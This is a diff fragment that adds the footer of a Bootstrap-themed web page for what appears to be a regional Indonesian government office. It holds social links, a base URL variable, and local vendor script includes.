+          <!-- Licensing information: https://bootstrapmade.com/license/ -->
+          <!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/bethany-free-onepage-bootstrap-theme/ --> Designed by <a href="https://bootstrapmade.com/">BootstrapMade</a>
+        </div>
+      </div>
+      <div class="social-links text-center text-md-right pt-3 pt-md-0">
+        <a href="#" class="twitter"><i class="bx bxl-twitter"></i></a>
+        <a href="#" class="facebook"><i class="bx bxl-facebook"></i></a>
+        <a href="#" class="instagram"><i class="bx bxl-instagram"></i></a>
+        <a href="#" class="google-plus"><i class="bx bxl-skype"></i></a>
+        <a href="#" class="linkedin"><i class="bx bxl-linkedin"></i></a>
+      </div>
+    </div>
+  </footer><!-- End Footer -->
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+  <!-- javascript variable -->
+  <script>
+    let baseURL = 'https://disperindagesdm.pinrangkab.go.id';
+  </script>
+  <!-- Vendor JS Files -->
+  <script src="/vendors/purecounter/purecounter.js"></script>
+  <script src="/vendors/aos/aos.js"></script>
+  <script src="/js/bootstrap.bundle.min.js"></script>
+  <script src="/vendors/glightbox/js/glightbox.min.js"></script>
+  <script src="/vendors/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="/vendors/swiper/swiper-bundle.min.js"></script>
+  <script src="/vendors/php-email-form/validate.js"></script>
+  <!-- jquery -->
+  <script src="/vendors/jquery/jquery.min.js"></script>
+  <!-- Template Main JS File -->
+  <script src="/js/main.js"></script>
+</body>
+
+</html>
